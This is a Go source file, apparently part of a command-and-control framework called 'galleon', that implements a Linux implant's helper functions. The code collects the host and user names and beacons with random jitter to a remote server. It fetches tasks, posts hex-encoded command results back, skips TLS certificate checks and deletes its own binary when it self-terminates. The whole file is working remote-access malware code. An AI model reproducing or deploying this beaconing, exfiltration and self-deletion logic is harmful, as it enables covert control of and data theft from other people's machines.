//go:build linux

package agent_helper

import (
	crand "crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	mathrand "math/rand"
	"net/http"
	"os"
	"os/user"
	"time"

	"bytes"
	"encoding/json"
	"galleon/agent_config"
	"galleon/debug"
)

var rng = mathrand.New(mathrand.NewSource(time.Now().UnixNano()))

type CallbackInfo struct {
	Callback_freq int
	Jitter        int
	SelfTerminate int
	StartDelay    int
}

type InitialInfo struct {
	Session       string `json:"session"`
	Hostname      string `json:"hostname"`
	Username      string `json:"username"`
	Callback_freq int    `json:"callback_freq"`
	Jitter        int    `json:"jitter"`
}

type ResultsCreate struct {
	TaskingID float64 `json:"tasking_id"`
	Session   string  `json:"session"`
	Task      string  `json:"task"`
	Args      string  `json:"args"`
	Results   string  `json:"results"`
}

var CustomClient = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: true,
	},
	Timeout: 10 * time.Second,
}

func GatherInfo() InitialInfo {
	bytes := make([]byte, 4)
	_, err := crand.Read(bytes)
	if err != nil {
		panic(err)
	}
	hexString := hex.EncodeToString(bytes)
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()

	hostInfo := InitialInfo{
		Session:       hexString,
		Hostname:      hostname,
		Username:      currentUser.Username,
		Callback_freq: agent_config.CallbackVal,
		Jitter:        agent_config.JitterVal,
	}
	return hostInfo
}

func InitialCheckin(serverUrl string, initialInfo InitialInfo) {
	for i := 0; i <= CallbackTimer.SelfTerminate; i++ {
		if i >= CallbackTimer.SelfTerminate {
			TerminateImplant()
		}
		resp, err := PostJson(serverUrl+"/implants/", initialInfo)
		if debug.Debug {
			fmt.Printf("[*] Firing initial checkin to: %s\n", serverUrl+"/implants/")
		}
		if err != nil || resp != 200 {

			time.Sleep(60 * time.Second)
		} else {
			return
		}

	}
}

func CheckIn(serverAddr string, session string) (int, error) {
	url := fmt.Sprintf("%s/health/%s", serverAddr, session)
	// Prevent auto redirects so if there is tasking 301 is actually returned and
	// we can fetch tasking, otherwise the main function will just return 200
	// and we will never get the tasking
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives: true,
		},
		Timeout: 10 * time.Second,
	}

	resp, err := client.Get(url)
	if debug.Debug {
		fmt.Printf("[*] Firing health checkin to: %s\n", serverAddr+"/health/"+session)
	}
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
	return resp.StatusCode, nil
}

func FetchTasking(serverAddr string, session string) (string, error) {
	url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)

	resp, err := CustomClient.Get(url)
	if debug.Debug {
		fmt.Printf("[*] Fetching tasking: %s", serverAddr+"/tasks/"+session)
	}
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(bodyBytes), nil
}

func RandomJitter(baseMinutes int, jitterPercent int) time.Duration {
	randomPercent := rng.Intn(jitterPercent + 1)
	jitterFraction := float64(randomPercent) / 100.0

	baseSeconds := baseMinutes * 60
	jitterSeconds := int(float64(baseSeconds) * jitterFraction)

	totalSeconds := baseSeconds + jitterSeconds

	jitterDuration := time.Duration(totalSeconds) * time.Second
	return jitterDuration
}

func PostJson(url string, payload interface{}) (int, error) {
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return 0, err
	}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return 0, err
	}

	for key, value := range agent_config.ReqHeaders {
		req.Header.Set(key, value)
	}
	resp, err := CustomClient.Do(req)

	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	_, _ = io.ReadAll(resp.Body)

	return resp.StatusCode, nil
}

func DataShipper(serverUrl string, taskData map[string]interface{}, results string) {
	encodedOutput := EncodeToBaseHexString(results)
	encodedArgs := EncodeToBaseHexString(taskData["args"].(string))

	result := ResultsCreate{
		TaskingID: taskData["id"].(float64),
		Session:   taskData["session"].(string),
		Task:      taskData["task"].(string),
		Args:      encodedArgs,
		Results:   encodedOutput,
	}
	_, _ = PostJson(serverUrl, result)

}

func TerminateImplant() {
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(3)
	}

	if _, err := os.Stat(exePath); err == nil {
		err := os.Remove(exePath)
		if err != nil {
			os.Exit(2)
		}
		os.Exit(1)
	}
	// Nothing on disk, just memory
	os.Exit(0)
}
